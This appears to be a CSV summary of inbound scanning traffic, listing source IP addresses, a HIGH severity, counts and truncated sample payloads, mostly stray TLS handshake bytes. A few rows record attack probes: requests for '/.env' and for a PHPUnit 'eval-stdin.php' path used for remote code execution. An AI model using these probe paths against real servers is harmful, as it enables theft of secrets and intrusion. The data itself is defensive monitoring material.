IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
167.94.146.62,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03F\x1B\xE9\x81BQ\xB7\x12\x96\x82S\xBA;~\x07\xD7\x86\xF1xE"
167.99.181.249,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xD6\xC9Y\xAC\xBB\x08\x04\xCB,d\xE1T\xC2\x22\xD3\xA4\xBE"
172.104.11.46,HIGH,1,"\x16\x03\x01\x01"
172.105.128.12,HIGH,1,"\x16\x03\x01\x01"
172.235.40.131,HIGH,1,"\x16\x03\x01\x01"
172.236.228.198,HIGH,1,"\x16\x03\x01\x01"
172.236.228.202,HIGH,1,"\x16\x03\x01\x01"
172.236.228.208,HIGH,1,"\x16\x03\x01\x01"
172.236.228.229,HIGH,1,"\x16\x03\x01\x01"
172.236.228.86,HIGH,1,"\x16\x03\x01\x01"
172.237.105.166,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03EI\x9CD\xE4\xC5\xC1\xDD\x80_E}\xF7\x8FuSK\xB8\x96:\xE5\x"
172.239.109.26,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03;\x16\x92\xD2\xCE\xE0\x15\x87\xB8\xEA\xDB\xB9\x8A\xA7\xC"
184.105.139.67,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFBI\xE2SA!\xEB\xE3\xB7\xC5R\xF1\xF1\x01\xFEb\xFE\x0Br\xB9Q\x"
184.105.139.68,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$\xCA\x1Dp\xA5\x22\x9F/\x85\xE1\xB3\x10\x5C\xCF\xED\xEC\xEB&a\"
184.105.139.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x92\x0CQ"
184.105.247.252,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03/\xC9(\xBA\x9D\xC8x\xCE\xF1\x85\x9C\xFD\x161DK\x016iFV\xAF\xC5"
184.105.247.254,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8B\x15c;N\xF8\x92f\xDEZ\x22\xB2\x08r\xD2*Ffg\x19\xA0/Q\x80=\"
185.242.246.125,HIGH,1,"\x16\x03\x01\x00\xE8\x01\x00\x00\xE4\x03\x03\xA9\xC0["
192.155.90.118,HIGH,1,"\x16\x03\x01\x01"
195.184.76.104,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x032\x96\xB08O&\xEFw'=\xFE\xBAf\xEC\xDD\xBC\x1F\xEE1\xB2\xB"
195.184.76.213,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xA7\x8F\xE6\x22b\xCF#\x0B\x08\x9C\x80i\xC0\x7F\x0B\xA63"
195.184.76.36,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03Q\xDC\xF8\xB4\xF3k\x92\xEC\xAA\xCF\xA1\x1AT\x1DP\x12d\xA"
199.45.154.118,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x98\x22\xE8\xF05\xDA\x87\xB0._\xA2(\x9F\x04\xEF\x03\xAC"
203.55.131.4,HIGH,1,"\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03}\x94O.\xA7\x9B}8\xA79\x95\x82\xAA\xE0l?9\xC7\x9D\x5C\x0"
204.76.203.73,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\x8E\xB0\xB3L\x03\xA8`\x8E\xD0\xC1H\x06\xBC"
206.168.34.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03e\x9B\x1BX\xC5\xCE\x95\xEF\xA9Gblc\x82\x0EL>/f<\x83'\xD7"
206.168.34.195,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03O*\x99\x88O\xDE\x91\xB4\xAE\x9Aa3\xD2\xDB~\x22:<\xCErV\x"
206.168.34.211,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5CVi[:`\xA2i1\xD2\x8E\x99\x9F\xEFIcziu\x1B~YL\xE74\xCE"
216.180.246.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF16\xE4\x1F\xCE\xB6\x06\x07J\xD5y\xEE\xFFA\xDD\xF3BJ\x"
216.180.246.191,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xBFh\x5C\x0B\xE7\x9Fo\x95\x82$;\xA0M\x5C\x8B\xA17\x82\x"
216.180.246.208,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x85\x88=\x87&\xFC\xD0Of\xD9SuY\x06\xBB\xB5\xA0Urw\xC3\x"
216.180.246.216,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB0\x0FG\xC0?:\x12^;\xF9\xA2\x07\x9E\xEB\xD2\xB2G\x1C\x"
216.218.206.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x06+Q\xA1)U\x8A\x00\xF0\x13\xA1\x8A@s\xD4W|7\xBDS\x9F\xDCA-\x"
223.199.184.238,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x9B\x9DA\xA5^\xD7,\x13\x0F?\xDC\x7F\x82\x98\x86[\x01\xA"
27.115.124.40,HIGH,1,"\x16\x03\x01\x015\x01\x00\x011\x03\x035J>\x94\x90\xBA\xD1l@\xF7f\x94\x11\xC3\xDA\x12c\x15P\x96\xACa\"
31.14.32.4,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x7F>\x8Am\x1E\x9B\xC1\xE9\x09=n\xEF\xB8%\xE1\x876|{x\x9"
31.14.32.5,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03*\xE0\xCB]\xCB\xA6\xD2\xE3\x1A\x1Edt"
31.14.32.7,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03M\x1E\xDF9e0{\xB2L>\xD2\xA9\xE4\x97\xE0\x83\xC0(\xC0\xC4"
3.137.73.221,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD6\x8D\x97?\x81\xF1e\xDE\x06\x15H'\xE1\xA2\xE0/:\x1B!\x9F7\x"
3.140.198.248,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB0Z\x89p_\x17\x96H\xAC!\xD0b\xC0\xF6\xC2\xCE\xBA\x80l6\x04\x"
3.149.59.26,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC4f\xB3\xBF~\x92\xE5\x9C\xA4w\xD2[\x17\x83\xE3\xDE\x9D\xB0\x"
3.15.25.196,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCAcL\xC5,\xAA2\x13\x98\xBE0\xD7*\xEC\xF2\xC6\xB0N=d\xA9Y\xC3"
38.110.46.241,HIGH,1,"\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x5C\xAE+B\x16\xCF\xCE\xEB\x7F\xFA\xFBE\xCC\x0E\x9CA]\xD9u\x12"
45.156.129.156,HIGH,1,"GET /cgi-bin/authLogin.cgi HTTP/1.1"
45.156.129.158,HIGH,1,"GET /cgi-bin/main.pl HTTP/1.1"
45.91.64.7,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x01\x18+\x1F\xE1K\x99\x08\xA08x\x98\x16\xAD\x87\x03=\xC"
64.226.111.158,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xC3@d;\xE4\x00\xDCt\x0C\x81\xAD\x5C\xFAk\xB5Ap\xBB\xC0\"
64.62.156.212,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAB\x83X\xC1\xB2M\xCF\x0B\x9Ee\xC0nve\xC0\xB2\xB7\x87q\xCBg\x"
65.49.1.10,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x00\x85\xB6\x0E5\xA4ml9M\x8C\xC2_pc\x12\xCCrW4\x96\xEAo \xFE\"
65.49.1.152,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03c0\xEBE\xB1\xBE\xC6-df\x89\xB1M\xD9p\xF1\xC6\x89Ym1\xB6\x1A\xE"
65.49.1.162,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03N\xDB\xD4\xE5\xE8:\x9A\xF3\xF8\xAD\x226[4KO8\xCB\xDA\xCB\x80\x"
65.49.1.172,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03e\x81\xB8Z\xBE\xD8\xF3\xFCA0\xE4Z\x1Bh7P\xA2\xA5\xA8\xD2\xDAm"
65.49.1.222,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_\x04\xDB\x0F\xAD'\xA7k\xB5\x9E\x95J\xB8RZ\xE7`R3\x16y\xA7\xAA"
65.49.1.94,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x86!\xA4\xE4\x1D!QG\xCD\xF8\xB7\xB3\x03RW\xFA\x11\xE9\xFB\xD8"
65.49.20.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03;\x15gdc\xB4\x12\xE9\xFA\xD8E\xCC-\xD7?\x08\x03\xCC\xC4\x0CK\x"
66.132.153.113,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEC[\x8F\x17ewnb\x8D\x82\x86\x05I\xA9\xB6\xF9\x154\xF5\"
74.82.47.2,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD4E~\xF6j:,\xA5\x1B\x01:\x8D\x026p\xB3\x1E\xC6O.\xC4$#\xC1\x"
74.82.47.4,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x039\x9F\x8D\xE2\xA6\x1F\x08\x09\xD2Eyy\x18_S\xDF\xFF?A\x1F\xA4\x"
8.210.123.17,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x96\xF8?\xADgo\x16\xCB\xB0\x03\xC5h\x09t\x8CH\x93rO %\xE9\x18"
91.196.152.14,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xB73\xA63\xEF\x1DS\xC9\xBB\x13\x0Bz\x0E\xDA"
91.196.152.18,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xC2A\xF9\x9F\xB8\xCF\x0E?\xFF\x0B\xD1\xE1\x0F\xFD-3\x03"
91.231.89.142,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03h\xB8\xF6a\x8B\xA1\xD9\x07fvd1\xF0l\x8C:\xC9\x9E\xDF-\xF"
91.92.240.222,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\x14@g\xE9}o\xB0*\x13P\x89\xC1\xA3\xCB\x04\xEC\xFC\xFA\x"
91.92.241.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFB3}j\xA4\x14s\xDDK\x89\x16\xA2\xC3\x9DZ\xA0h,\x8A\x10"
91.92.242.214,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03^\xA8\xA7#\xBBl\x1F\xC1\xCA\xD87/\xF3\xF6\x11\xC7B\xBB\x"
92.63.197.50,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xBCZ(O\xB0\x91N.\x83-\x0B/k\x00\x91xt\xFF\xE7\xEF\x09(\"
118.193.64.235,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xCB\xBA\xE6\xD9\x94\xE9-|/\xD7\x83A\xEB4q\xE7\xA5\xEF\x"
118.194.228.239,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xBD\xECn+\x8D\x18fZy;v^\x10\xBC\xAAk\x05's]\xD8\x11\xA6"
123.58.196.49,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03$\xD6\x8F\xE3\x15\xE4\xE0\xD0:\xE1)\xAC\xD4|\x1DD"
123.6.49.6,HIGH,1,"\x16\x03\x01\x016\x01\x00\x012\x03\x03\x1F\x0F\x95w\x1D+\x10\xE5,\x05\x1E2\xA8j\xFD?\x04\xC3\xEB\xF6"
146.190.63.248,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xA0\x9DW\x10/\xB3\xBF\x9A\xA3\xF4%\x13\x99nA\xC4~\x8A\x"
150.107.38.5,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\x8B\xC9\x82\xF3\x90\xF9\xBA3xb\x9B\xAC\xFD!\xD4\x1D\xC4"
152.32.141.176,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xF9\xCCN\x07C\x14\x87m\x96L\x84\xA6I\x8FyB\x19\x99m\x5C"
159.65.152.20,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_\xA6\xBA\x0EW6.E\x981\xF7\xDAcJ\xA4^u$\x1B\xC9B\xA1c\x16\xDAy"
162.142.125.118,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03~\xB9\x80J\x18\xCEd\xE1M\x81\xBC\x18\x8A\xA8\x84\xD0>);\"
162.142.125.192,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x98?\xF1z\xBFV\xDF\xF7v\xA1\x05\x82\xD0\xA5\x8F#!E\xF6q"
162.142.125.199,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x81\xB7\xA1\xEE\x80c\xACCJ\x98\x09M\xB1'k\x9E\xDCu\xAA\"
162.142.125.202,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x033\x14A`\xE7\x1C\x8Bf\xF9\x0C\xE0T1\x97\x87o]\xEF\x0E49\x"
162.142.125.211,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB0\x911|5i4W\x12m\x98Y\x11"
167.71.34.54,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03<\x1F6\xE5\x8E;\xB2\xE4\xD2\x13\x84\xBD^\xFFy\xD6\xF0,\x"
167.94.138.122,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03u\xFEWk\xBF\xE4\x1D\xE9\xB0,#\xA6\xA5\xEA\xE5\xAA\xD9I\x"
167.94.138.194,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03B\x8D\xAB\x95B"
167.94.138.201,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03%)f~+\xF5<+\xD4|\xFC\xE7\x1CK\xA0\xED\x08\x0C\x5C\xD5\x0"
167.94.138.32,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF2\x8C\xA4j\xBA\xBF\xF9f\x9DJ\x191\xE7b\x94\xA1\xDF\xE"
167.94.138.39,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE7\x1E\xF2AV\x92\x8BF\x7F\xFD\x88J\x81"
167.94.138.43,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03aT\xC9\xABx``\xD8\x08\xFF\x82g\xB2\xC9,o\x1E\x9CzM\xFAMd"
167.94.138.55,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE5\xDE\x9E\xAC\xA3\x99\x8D,\xA2\xA8\x80/|\x01_@6\xCF\x"
167.94.146.53,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA0\xE0\x90<9\x9D\xF0j\xBC\x0B\x8CN\x1CL\x1C\x1C\xD6S\x"
172.104.11.4,HIGH,1,"\x16\x03\x01\x01"
172.105.128.11,HIGH,1,"\x16\x03\x01\x01"
172.236.228.218,HIGH,1,"\x16\x03\x01\x01"
172.236.228.227,HIGH,1,"\x16\x03\x01\x01"
172.236.228.245,HIGH,1,"\x16\x03\x01\x01"
172.236.228.38,HIGH,1,"\x16\x03\x01\x01"
172.239.103.228,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03R\xC7\x95\x08\xE5\xB0j\xB653\xD9\x93\xC3\xABQ\x90\xB1\x0"
172.239.109.149,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03S.\x85\xEB^\x0F\xD7k3}\xE7\xA4't\x83\xEA9\xC1n\x87\xC1_a"
173.239.240.70,HIGH,1,"POST /.env HTTP/1.1"
173.239.240.75,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
173.239.240.83,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
181.215.65.83,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
185.209.198.206,HIGH,1,"\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00"
185.242.226.40,HIGH,1,"\x16\x03\x01\x01\x00\x01\x00\x00\xFC\x03\x03\x16\xC9n5\xB7W\x89Zc\xA5%\x16V"
185.242.246.115,HIGH,1,"\x16\x03\x01\x00\xE8\x01\x00\x00\xE4\x03\x03\xE4\xF1q\xE3\x1E\x94F\x22\xA6\x81\x8B\xB1\xC8\xD1\xFA\x"
192.155.90.220,HIGH,1,"\x16\x03\x01\x01"
194.164.107.4,HIGH,1,"\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03\xC6\xAA>\xC0\x86\xEE\xCCB\xD2J\x93(H\x19h\xBB\xFBC\x03"
195.184.76.172,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03\x9Fu\xFB 8\xC2`\xD9s\xBF\xA3\xF0\xD2\xD7\xFD\xD8\xAC\xF"
206.168.34.112,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD5\xB9~\x13\xB2\x86\xCC*\x1E=[\xEF\x1A!\xEF\xB2L\xF5\x"
206.168.34.199,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03':q\x8E"
206.168.34.207,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB8\xAC\x8F\x12p&#\x10r\x82\x0B@\xD0\xD7\x0C\xAD\xB6E2\"
206.168.34.32,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE2\xEE[\xFCn\x87g\x90\xFE7+v\xD0\xF0\x88\xB98`\xADB\x0"
206.168.34.37,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFD\xF9J[\x9A\xE8\xA6?~f\x9Dp\xAE\x155\x9AYy\xA0\xEBr\x"
206.168.34.59,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03g\xFF=\x81\x11\xA5\xE4\xDA\xD6oG\x9ED{\x1B\x09Va\x9B\x9B"
209.97.137.68,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x8E\x1B\xC1\xD2\x8D\x05?Q\xFE\x1FM\x06\xDB\xE8\x8D\xF4g"
210.92.106.113,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03'\xE8\xEFQ\xE0\xBE\xB7\x9A\xE9\xEBh~\x93\xF0\x90\x90\xF8"
216.180.246.104,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB23"
216.180.246.190,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03j\x84\x84\xEEu8:\xDF\xAE\xA3(\xC9t\xC9\x1FN\xD3\xD1\xD4\"
216.180.246.53,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEBxO\xE9\x01\xA3\xDAh\x90\x9B?\xD1\xFBtq\x06\x89\xD3\x"
3.148.178.131,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03 \x8A;\xA8\x81\x12\x1C4Y:\xE0A\xB8]\x93\xF5\x1FA\x8F\x8B\x5Co0"
3.18.105.83,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03l\xEC\x0EG\x8A_\x04\xF5\xB7\x06Pkg\x1Br\x88\xD1\xA07\xBA\x00\x"
45.79.128.205,HIGH,1,"\x16\x03\x01\x01"
45.79.181.94,HIGH,1,"\x16\x03\x01\x01"
46.161.50.108,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x95m\xF5Hf\xE8\x9E\xA0V\xAB'R\xC6\x9C\x09\xE9/;\x90\x87"
5.101.64.6,HIGH,1,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
5.181.86.46,HIGH,1,"\x16\x03\x03\x00\x8E\x01\x00\x00\x8A\x03\x03iy_j\x1D\x0Bp\x89p]\x8D\xBC\x960\xAFWh<\xD6\xBBD\x9A\xCA"
64.62.156.132,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB6\xA6f\xD9(&\xB5\xE0\xCF\x17\x17\xD5bM\xA5-b\xACT\x84Z \x03"
64.62.156.152,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x033\xEA}\xB9\x9A\xEAR\xED\xB6`\xE7\xA1\x86\x97\x83\xBE"
64.62.156.162,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x039\xB8\xBF\xD3\xC7\xD7#5\x1AV.NA\x04\xB4\xAC\xEC\x8B\x00\xC0\x9"
64.62.197.227,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x19\xD0M\x80\xF7!w\xF3M\x09\xA6\x0B\xA8$\xD0\xA3\xB4\x9D\x19\"
64.62.197.47,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1F\xC9\x87\x91\xE2z\xF9\x05B7%\xF8%\x13\xC0\xA7\x90\x98\x07A"
64.62.197.92,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDD\xCB\x1DB\xE5\xEB,\x0C\xD7K\xD6R\xB8\xF7tt\xDE\x01n/\x88i\"
65.49.1.182,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFF\x9C\x82R\xBD\xAC\x1C\xED.Y\xF8\xD0L\x946o\x89(\x8E\xDD#\x"
91.196.152.23,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03-\x88\xFF$;\x8F\xF5\xEE\xA6\x22.$\x13\xC1\x0B\xA8\xA2\x0"
91.230.168.14,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03\xD9B\x1F\xB1\x0EI~\xE8\x91\x00+\xE2|\xE8\xDF\xB7"
91.92.241.152,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xE4\x8B\xD9\xD00[\x89I#7nQ9h\xE2q|\x17\xC4'\xA8|\xC8\xE"
93.123.109.124,HIGH,1,"\x16\x03\x01\x00\x9A\x01\x00\x00\x96\x03\x03\xBDu\xB5\x22R\x1Bk\x19\x05\x07G\xE5\xA5\x9C\x8Fn\x07NM\"
162.142.125.115,HIGH,1,"\x16\x03\x01\x00\xFF\x01\x00\x00\xFB\x03\x03Zb\xC7#\x22-\xDC\xE9\x9B\xD8\xDB\xA0\x8A+\xE2t\x09R\xFD\"
165.232.126.88,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xAA\x8A\xE2\x8CJc\x86\x18\xA4AP\xE0\x15\xAA\x96l\x0Fo\x"
167.94.138.185,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03G\x01\x98\xEDz\xB8\xCF\x11A\xB4\x0C<\x97\xB3\x1A=\x89\x1"
172.236.228.115,HIGH,1,"\x16\x03\x01\x01"
178.22.24.64,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03;q\x1C\x5C\x14\x9E\x09Ja\xFDn\xCD\xA0\x84d\xCB=\x18\xC7\"
206.168.34.126,HIGH,1,"\x16\x03\x01\x00\xFF\x01\x00\x00\xFB\x03\x03\x8B\x15\x04\xC8\xCFB\xA2\x9BqUp\xAE\x91r[S*\xAA\xAEE\xC"
206.168.34.192,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03_\x9B\x14\x19t*d:\xB0\x03\xE0\xD1\x03\xC4'/$\xED\x02\xAF"
216.218.206.68,HIGH,1,"\x16\x03\x01\x00\x99\x01\x00\x00\x95\x03\x03\xAEN\x17\xE6\xC4MI5\x9E!h\xE1\xF2MAI\xD2R}("
45.79.181.104,HIGH,1,"\x16\x03\x01\x01"
64.62.156.172,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE7K\x954\x8Cf\xCD\xD1\xBE\xFDM(\xBA\xCB\x02\x8A\x8C+5\x06u\x"
64.62.156.38,HIGH,1,"\x16\x03\x01\x00\x99\x01\x00\x00\x95\x03\x03\xE0\x8Fn\xC7\xADc\x82J\x9B\xA8\xD3\xD9\xB0"
64.62.156.52,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03>\x1B\xC2d>[\xF6\x88a*\x1CR\xD93Zc\x22"
79.124.40.174,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xCB\xD5]\xA9C9\xD7\xCA\xF6_`\x08jR\xBD\x9D\x15\x04\xD7\"
